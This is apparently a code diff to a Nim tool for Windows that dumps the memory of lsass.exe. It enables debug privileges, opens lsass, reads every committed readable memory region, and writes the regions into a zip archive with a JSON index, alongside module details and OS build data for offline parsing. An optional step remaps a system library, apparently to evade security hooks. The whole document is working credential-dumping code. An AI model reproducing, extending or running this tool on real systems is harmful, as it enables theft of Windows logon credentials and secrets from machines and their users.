@@ -1,9 +1,10 @@
 import winim/lean
 import strformat
 import strutils
+import zippy/ziparchives
+import tables
 import std/json
 import parseopt
-
 
 const
   MAX_PATH = 260
@@ -14,6 +15,13 @@ const
   FLinkDllBaseOffset = 0x20
   FLinkBufferFullDllNameOffset = 0x40
   FLinkBufferOffset = 0x50
+  MAX_MEMFILES = 1024
+
+type
+  MemFile* = object
+    filename*: string
+    content*: ptr UncheckedArray[byte]
+    size*: csize_t
 
 type
   ModuleInformation* = object
@@ -36,6 +44,7 @@ type MEMORY_INFORMATION_CLASS* = enum
     MemoryBasicInformation = 0
 
 
+proc RtlGetVersion*(lpVersionInformation: var OSVERSIONINFOEX): NTSTATUS {.discardable, dynlib: "ntdll", importc: "RtlGetVersion".}
 proc NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtOpenProcessToken".}
 proc NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: ptr TokenPrivileges, BufferLength: DWORD, PreviousState: PVOID, ReturnLength: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtAdjustPrivilegesToken".}
 proc NtClose(Handle: HANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtClose".}
@@ -187,6 +196,151 @@ proc getProcessByName*(procName: string): HANDLE =
     return 0
 
 
+proc GenerateZip*(zipFilename: string, memfiles: openArray[MemFile]) =
+  ## Crea un ZIP a partir de archivos en memoria usando Zippy (createZipArchive)
+  try:
+    var files = initTable[string, string]()
+
+    for memfile in memfiles:
+      if not memfile.content.isNil and memfile.size > 0:
+        let filename = memfile.filename
+        if filename.len > 0:
+          var data = newString(memfile.size)
+          copyMem(addr data[0], memfile.content, memfile.size)
+          files[filename] = data
+
+    let zipData = createZipArchive(files)
+    writeFile(zipFilename, zipData)
+
+    echo "[+] File ", zipFilename, "  generated correctly"
+  except:
+    echo "[-] Error al generar el ZIP"
+
+
+proc barrel*(hProcess: HANDLE, jsonFile: string, zipFile: string) =
+  # Initialize scan variables
+  var
+    memfileList: array[MAX_MEMFILES, MemFile]
+    memfileCount = 0
+    jsonOutput = "["
+    procMaxAddress = 0x7FFFFFFEFFFF'u64
+    memAddress: PVOID = nil
+
+  while cast[uint64](memAddress) < procMaxAddress:
+    var mbi: MEMORY_BASIC_INFORMATION
+    var returnSize: SIZE_T
+
+    let ntstatus = NtQueryVirtualMemory(
+        hProcess,
+        memAddress,
+        MemoryBasicInformation,
+        addr mbi,
+        sizeof(mbi).SIZE_T,
+        addr returnSize
+    )
+    
+    if ntstatus != 0:
+        echo fmt"[-] Error NtQueryVirtualMemory: 0x{ntstatus:X}"
+        break
+
+    if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT and ((mbi.Protect and PAGE_GUARD) == 0):
+        let filename = "0X" & fmt"{cast[int](mbi.BaseAddress):X}"
+        
+        let regionSize = mbi.RegionSize
+        let buffer = cast[ptr UncheckedArray[byte]](alloc(regionSize))
+        var bytesRead: SIZE_T = 0
+
+        ### echo fmt"[+] Dumping {filename} ({regionSize} bytes)"
+        let status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, buffer, regionSize, addr bytesRead)
+        let unsignedStatus = cast[uint32](status)
+        if mbi.Protect == 260 or mbi.Protect == 258:
+          echo "bbb"
+          echo "status ",status
+          echo "unsignedStatus ",unsignedStatus
+
+        const STATUS_SUCCESS = 0x00000000'u32
+        const STATUS_PARTIAL_COPY = 0x8000000D'u32
+
+        if unsignedStatus != STATUS_SUCCESS and unsignedStatus != STATUS_PARTIAL_COPY:
+            echo fmt"[-] Error reading 0x{cast[int](mbi.BaseAddress):X} (NTSTATUS: 0x{unsignedStatus:08X})"
+            dealloc(buffer)
+            break
+
+        jsonOutput.add(fmt"""{{"field0":"{filename}","field1":"0X{cast[int](mbi.BaseAddress):X}","field2":{regionSize}}},""")
+
+        ## DEBUG
+        var hexBytes = ""
+        if regionSize > 0:
+            hexBytes = newStringOfCap(36)  # 12 bytes * 3 caracteres (máximo)
+            for i in 0..<min(12, regionSize):
+                hexBytes.add(fmt"{buffer[i]:02X}")
+                if i < min(12, regionSize) - 1:  # Añadir espacio solo entre bytes
+                    hexBytes.add(" ")
+        #echo fmt"""{{"region":"{filename}","size":{regionSize},"first_bytes":"{hexBytes}"}}"""
+
+        # Create MemFile
+        if memfileCount < MAX_MEMFILES:
+            memfileList[memfileCount] = MemFile(
+                filename: filename,
+                content: buffer,
+                size: cast[csize_t](regionSize)
+            )
+            inc memfileCount
+        else:
+            echo "[-] ¡Lista de MemFiles llena! Omitiendo región."
+            dealloc(buffer)
+
+    # Next region
+    memAddress = cast[PVOID](cast[uint64](memAddress) + cast[uint64](mbi.RegionSize))
+
+  echo fmt"[+] Number of memory regions: {memfileCount}"
+
+  # Finalize JSON output (remove trailing comma and close array)
+  if jsonOutput.len > 1:
+    jsonOutput.setLen(jsonOutput.len-2) # Remove last ", "
+  jsonOutput.add("}]")
+  writeFile(jsonFile, $jsonOutput)
+  echo "[+] File ", jsonFile, " generated correctly"
+
+  GenerateZip(zipFile, memfileList)
+
+
+proc findModuleByName*(moduleList: ptr ModuleInformation, listSize: int, auxName: array[MAX_PATH, char]): ModuleInformation =
+    ## Finds a module by name in the module list
+    for i in 0..<listSize:
+        let currentModule = cast[ptr UncheckedArray[ModuleInformation]](moduleList)[i]
+        if cmpIgnoreCase($currentModule.base_dll_name, $cast[cstring](addr auxName[0])) == 0:
+            return currentModule
+    
+    # Return empty module if not found
+    var emptyModule: ModuleInformation
+    zeroMem(addr emptyModule, sizeof(ModuleInformation))
+    return emptyModule
+
+
+proc findModuleIndexByName*(
+    moduleList: ptr ModuleInformation,
+    listSize: int,
+    auxName: array[MAX_PATH, char]
+): int =
+  ## Finds the index of a module by name by comparing null-terminated strings
+  # Convert auxName buffer to a Nim string (C-style null-terminated)
+  let target = $cast[cstring](addr auxName[0])
+  for i in 0..<listSize:
+    let currentModule = cast[ptr UncheckedArray[ModuleInformation]](moduleList)[i]
+    # Convert module's base_dll_name buffer to Nim string
+    let name = $cast[cstring](addr currentModule.base_dll_name[0])
+    # Compare case-insensitively
+    if cmpIgnoreCase(name, target) == 0:
+      return i
+  return -1
+
+
+proc replaceBackslash(src: cstring): string =
+  result = $src
+  result = result.replace("\\", "\\\\")
+
+
 proc customGetModuleHandle*(hProcess: HANDLE, moduleCount: ptr int): ptr ModuleInformation =
   var
     moduleList = cast[ptr ModuleInformation](alloc(1024 * sizeof(ModuleInformation)))
@@ -257,48 +411,7 @@ proc customGetModuleHandle*(hProcess: HANDLE, moduleCount: ptr int): ptr ModuleI
   return moduleList
 
 
-proc findModuleByName*(moduleList: ptr ModuleInformation, listSize: int, auxName: array[MAX_PATH, char]): ModuleInformation =
-    ## Finds a module by name in the module list
-    for i in 0..<listSize:
-        let currentModule = cast[ptr UncheckedArray[ModuleInformation]](moduleList)[i]
-        if cmpIgnoreCase($currentModule.base_dll_name, $cast[cstring](addr auxName[0])) == 0:
-            return currentModule
-    
-    # Return empty module if not found
-    var emptyModule: ModuleInformation
-    zeroMem(addr emptyModule, sizeof(ModuleInformation))
-    return emptyModule
-
-
-proc findModuleIndexByName*(
-    moduleList: ptr ModuleInformation,
-    listSize: int,
-    auxName: array[MAX_PATH, char]
-): int =
-  ## Finds the index of a module by name by comparing null-terminated strings
-  # Convert auxName buffer to a Nim string (C-style null-terminated)
-  let target = $cast[cstring](addr auxName[0])
-  for i in 0..<listSize:
-    let currentModule = cast[ptr UncheckedArray[ModuleInformation]](moduleList)[i]
-    # Convert module's base_dll_name buffer to Nim string
-    let name = $cast[cstring](addr currentModule.base_dll_name[0])
-    # Compare case-insensitively
-    if cmpIgnoreCase(name, target) == 0:
-      return i
-  return -1
-
-
-proc replaceBackslash(src: cstring): string =
-  result = $src
-  result = result.replace("\\", "\\\\")
-
-
-proc shock*(fileName: string) =
-  enableDebugPrivileges()
-  let hProcess = getProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
-  if hProcess == 0:
-    quit(-1)
-
+proc shock*(hProcess: HANDLE, fileName: string) =
   var moduleCounter: int = 0
   let moduleInformationList = customGetModuleHandle(hProcess, addr moduleCounter)
   echo "[+] Number of modules: ", moduleCounter
@@ -418,6 +531,29 @@ proc shock*(fileName: string) =
 
   except IOError as e:
     echo "[-] Error opening file ", filename, ": ", e.msg
+
+
+proc getBuildNumber*(): OSVERSIONINFOEX =
+  var osVersionInfo: OSVERSIONINFOEX
+  osVersionInfo.dwOSVersionInfoSize = DWORD sizeof(OSVERSIONINFOEX)
+  discard RtlGetVersion(osVersionInfo)
+  result = osVersionInfo
+
+
+proc writeToFile*(path: string, content: string) =
+  writeFile(path, content)
+  echo "[+] File ", path, " generated correctly"
+
+
+proc lock*(fileName: string) =
+  let osVersionInfo = getBuildNumber()
+  let versionData = %*{
+    "field0": $osVersionInfo.dwMajorVersion,
+    "field1": $osVersionInfo.dwMinorVersion,
+    "field2": $osVersionInfo.dwBuildNumber,
+  }  
+  let wrapper = %*[versionData]
+  writeToFile(fileName, $wrapper)
 
 
 proc custom_get_module_address*(h_process: HANDLE, module_name: string): uint64 =
@@ -684,7 +820,7 @@ proc remap_library*() =
 
 proc main() =
   var
-    jsonFile = "shock.json"
+    zipFile = "barrel.zip"
     shouldRemap = false
 
   for kind, key, val in getopt():
@@ -693,9 +829,9 @@ proc main() =
       discard  # Handle positional arguments if needed
     of cmdLongOption, cmdShortOption:
       case key
-      of "j", "json":
+      of "z", "zip":
         if val.len > 0:
-          jsonFile = val
+          zipFile = val
       of "r", "remap":
         shouldRemap = true
       else:
@@ -706,7 +842,14 @@ proc main() =
 
   if shouldRemap:
     remap_library()
-  shock(jsonFile)
+  
+  enableDebugPrivileges()
+  let hProcess = getProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
+  if hProcess == 0:
+    quit(-1)
+  lock("lock.json")
+  shock(hProcess, "shock.json")
+  barrel(hProcess, "barrel.json", "barrel.zip")
 
 
 when isMainModule:
